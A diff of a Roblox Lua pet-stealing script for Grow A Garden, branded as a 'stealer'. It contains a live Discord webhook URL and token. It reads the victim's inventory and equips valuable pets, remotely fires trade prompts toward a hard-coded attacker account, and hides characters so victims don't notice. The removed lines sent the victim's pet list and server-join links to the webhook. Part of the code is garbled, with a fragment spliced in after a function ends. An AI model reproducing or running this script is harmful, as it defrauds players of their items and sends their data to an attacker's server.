@@ -1,13 +1,15 @@
+repeat task.wait() until game:IsLoaded()
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
--- === Config ===
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
+local dataModule = require(ReplicatedStorage.Modules.DataService)
 
 local USERNAMES = {
-    "Elaine_Pets18"  -- attackers
+    "Elaine_Pets18"
 }
 
 local PET_WHITELIST = {
@@ -29,15 +31,12 @@ local PET_PRIORITY = {
     "Butterfly"
 }
 
-local dataModule = require(ReplicatedStorage.Modules.DataService)
 local victimPetTable = {}
 
--- Helper to check whitelist
 local function checkPetsWhitelist(petName)
     return PET_WHITELIST[petName] ~= nil
 end
 
--- Get pet tool by UUID from backpack or character
 local function getPetObject(petUUID)
     for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
         if obj:GetAttribute("PET_UUID") == petUUID then
@@ -54,7 +53,6 @@ local function getPetObject(petUUID)
     return nil
 end
 
--- Equip pet tool
 local function equipPet(pet)
     if pet:GetAttribute("d") then
         ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
@@ -64,114 +62,25 @@ local function equipPet(pet)
     end
 end
 
--- Teleport to target player
-local function teleportTarget(targetName)
+-- Trigger trade prompt remotely WITHOUT teleporting
+local function triggerTradePromptRemote(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+    if not targetPlayer or not targetPlayer.Character then return end
+
+    local head = targetPlayer.Character:FindFirstChild("Head")
+    if not head then return end
+
+    local prompt = head:FindFirstChildWhichIsA("ProximityPrompt")
+    if prompt then
+        prompt:InputHoldBegin()
+        task.wait(0.1)
+        prompt:InputHoldEnd()
+        print("[TradeTrigger] Trade prompt triggered remotely on "..targetName)
+    else
+        print("[TradeTrigger] No ProximityPrompt found on "..targetName)
     end
 end
 
--- ** STEALTHY STEAL FUNCTION **
-local function startSteal(targetName)
-    local targetPlayer = Players:FindFirstChild(targetName)
-    if targetPlayer then
-        -- Fire the server event directly instead of using ProximityPrompt
-        local stealEvent = ReplicatedStorage:WaitForChild("GameEvents"):FindFirstChild("StealPet")
-        if stealEvent then
-            stealEvent:FireServer(targetPlayer)
-        else
-            warn("StealPet event not found!")
-        end
-    end
-end
-
--- Check and steal pets based on whitelist and priority
-local function checkPetsInventory(targetName)
-    local petsData = dataModule:GetData().PetsData.PetInventory.Data
-
-    -- Priority pets first
-    for _, priorityPetName in ipairs(PET_PRIORITY) do
-        for petUUID, petData in pairs(petsData) do
-            if petData.PetType == priorityPetName then
-                local petObject = getPetObject(petUUID)
-                if petObject then
-                    equipPet(petObject)
-                    task.wait(0.2)
-                    startSteal(targetName)
-                end
-            end
-        end
-    end
-
-    -- Then the rest in whitelist excluding priority pets
-    for petUUID, petData in pairs(petsData) do
-        if checkPetsWhitelist(petData.PetType) and not table.find(PET_PRIORITY, petData.PetType) then
-            local petObject = getPetObject(petUUID)
-            if petObject then
-                equipPet(petObject)
-                task.wait(0.2)
-                startSteal(targetName)
-            end
-        end
-    end
-end
-
--- Wait if attacker is present in the server and return name
-local function waitForJoin()
-    for _, player in pairs(Players:GetPlayers()) do
-        if table.find(USERNAMES, player.Name) then
-            return true, player.Name
-        end
-    end
-    return false, nil
-end
-
--- Locally hide attacker characters on victim client
-local function hideAttackersLocally()
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and table.find(USERNAMES, player.Name) then
-            if player.Character then
-                for _, part in pairs(player.Character:GetDescendants()) do
-                    if part:IsA("BasePart") then
-                        part.LocalTransparencyModifier = 1
-                        part.CanCollide = false
-                        part.CastShadow = false
-                    elseif part:IsA("Decal") or part:IsA("Texture") then
-                        part.Transparency = 1
-                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
-                        part.Enabled = false
-                    elseif part:IsA("ParticleEmitter") or part:IsA("Trail") then
-                        part.Enabled = false
-                    end
-                end
-            end
-        end
-    end
-end
-
--- Main loop: wait for attacker to join, teleport, steal pets, and hide attacker
-local function idlingTarget()
-    task.spawn(function()
-        while task.wait(0.2) do
-            local found, targetName = waitForJoin()
-            if found then
-                teleportTarget(targetName)
-                checkPetsInventory(targetName)
-                hideAttackersLocally()
-            end
-        end
-    end)
-end
-
--- Build victim pet list for Discord embed report
-for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-    if checkPetsWhitelist(petData.PetType) then
-        table.insert(victimPetTable, petData.PetType)
-    end
-end
-
--- Discord webhook embed sender (simplified)
 local function createDiscordEmbed(petList, totalValue, fileUrl)
     local embed = {
         title = "🌵 Grow A Garden Hit - KUNI SCRIPT STEALER 💸",
@@ -187,6 +96,7 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                 ),
                 inline = false
             },
+        
             {
                 name = "🌴 **Backpack**",
                 value = string.format("```%s```", petList),
@@ -235,65 +145,9 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
     end
 end
 
--- Run main logic
-idlingTarget()
-
-task.spawn(function()
-    while task.wait(0.5) do
-        if #victimPetTable > 0 then
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/yourfileurl/items.txt")
-            break
-        end
-    end
-end)                inline = false
-            },
-            {
-                name = "🏝️ **Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
-                    game.JobId, 
-                    game.PlaceId, 
-                    game.JobId
-                ),
-                inline = false
-            }
-        },
-        footer = {
-            text = string.format("%s | %s", game.PlaceId, game.JobId)
-        }
-    }
-
-    local data = {
-        content = string.format(
-            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
-            game.PlaceId,
-            game.JobId
-        ),
-        username = LocalPlayer.Name,
-        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
-        embeds = {embed}
-    }
-
-    local jsonData = HttpService:JSONEncode(data)
-    local headers = { ["Content-Type"] = "application/json" }
-
-    local request = http_request or request or HttpPost or syn.request
-    local response = request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = headers,
-        Body = jsonData
-    })
-
-    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
-        warn("Error sending to Discord:", response.StatusCode, response.Body)
-    end
-end
-
 local function checkPetsInventory(targetName)
     local petsData = dataModule:GetData().PetsData.PetInventory.Data
 
-    -- First, try priority pets first
     for _, priorityPetName in ipairs(PET_PRIORITY) do
         for petUUID, petData in pairs(petsData) do
             if petData.PetType == priorityPetName then
@@ -301,20 +155,19 @@ local function checkPetsInventory(targetName)
                 if petObject then
                     equipPet(petObject)
                     task.wait(0.2)
-                    startSteal(targetName)
+                    triggerTradePromptRemote(targetName)
                 end
             end
         end
     end
 
-    -- Then, try the rest of the pets excluding priority pets
     for petUUID, petData in pairs(petsData) do
         if checkPetsWhitelist(petData.PetType) and not table.find(PET_PRIORITY, petData.PetType) then
             local petObject = getPetObject(petUUID)
             if petObject then
                 equipPet(petObject)
                 task.wait(0.2)
-                startSteal(targetName)
+                triggerTradePromptRemote(targetName)
             end
         end
     end
@@ -329,7 +182,6 @@ local function waitForJoin()
     return false, nil
 end
 
--- NEW FUNCTION TO HIDE YOURSELF LOCALLY
 local function hideSelf()
     if LocalPlayer.Character then
         for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
@@ -350,13 +202,11 @@ end
 
 local function idlingTarget()
     task.spawn(function()
-        hideSelf() -- Hide yourself locally so victims can't see you
+        hideSelf()
         while task.wait(0.2) do
             local found, targetName = waitForJoin()
             if found then
-                teleportTarget(targetName)
                 checkPetsInventory(targetName)
-                -- You can add more local invisibility functions if needed here
             end
         end
     end)
